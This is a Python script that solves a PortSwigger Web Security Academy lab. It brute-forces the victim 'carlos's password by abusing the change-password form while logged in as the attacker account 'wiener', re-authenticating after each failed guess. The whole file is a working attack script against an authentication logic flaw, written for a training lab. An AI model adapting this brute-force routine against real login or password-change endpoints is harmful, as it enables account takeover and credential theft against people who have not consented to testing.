# Autonomous proof-of-concept script for Portswigger Lab: 
# "Password brute-force via password change"

import requests
import sys

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ERROR_CODE = 1
BASE_URL = "https://0a9c00cc0401e1e382af6533009d00a4.web-security-academy.net"
EXPECTED_PASSWORD_CHANGE_MESSAGE = "Password changed successfully!"
PROXIES = {
     "http": "http://127.0.0.1:8080", 
     "https": "http://127.0.0.1:8080",
}

def read_into_list(file):
    list = []

    with open(file) as file_object:
        contents = file_object.readlines()
        for line in contents:
            list.append(line.strip())

    return list


def login(user, password):
    endpoint = "login"
    url = f"{BASE_URL}/{endpoint}"

    data = {
        "username": user,
        "password": password,
    }

    try:
        response = requests.post(url, data=data, proxies=PROXIES, 
                                 verify=False, allow_redirects=False)
    except Exception as general_exception:
            print(f"[INFO ] An exception occurred: {general_exception}")
            sys.exit(ERROR_CODE)

    if response.status_code != 302:
            print("[INFO ] An error occurred while logging in")
            sys.exit(ERROR_CODE)

    return response.cookies


def bruteforce_password_via_change_passsword(login_cookies, user, passwords):
    endpoint = "my-account/change-password"
    url = f"{BASE_URL}/{endpoint}"

    for password in passwords:    
        data = {
            "username": user,
            "current-password": password,
            "new-password-1": password,
            "new-password-2": password,
        }

        try:
            response = requests.post(url, cookies=login_cookies, 
                                     data=data, proxies=PROXIES, verify=False)
        except Exception as general_exception:
            print(f"[INFO ] An exception occurred: {general_exception}")
            sys.exit(ERROR_CODE)

        if (response.status_code == 200 
            and EXPECTED_PASSWORD_CHANGE_MESSAGE in response.text):
            print(f"[INFO ] Enumerated password '{password}' for user {user}!")
            return password
        
        # New login cookies required after each failed password change.
        login_cookies = login(user="wiener", password="peter")


def main():
    evil_user = "wiener"
    evil_password = "peter"

    victim_user = "carlos"
    victim_password_file = "passwords.txt"
    victim_passwords = read_into_list(victim_password_file)

    print(f"[DEBUG] Obtaining login cookie for bruteforce attempt ...")
    login_cookies = login(user=evil_user, password=evil_password)
    print(f"[INFO ] Succesfully logged in! \n[INFO ] Login cookie: {login_cookies["session"]}")

    print()

    message = f"[DEBUG] Attempting password bruteforce attack " 
    message += f"via password change on user '{victim_user}' ..."

    print(message)
    victim_password = bruteforce_password_via_change_passsword(
         user=victim_user, passwords=victim_passwords, 
         login_cookies=login_cookies)


if __name__ == "__main__":
    main()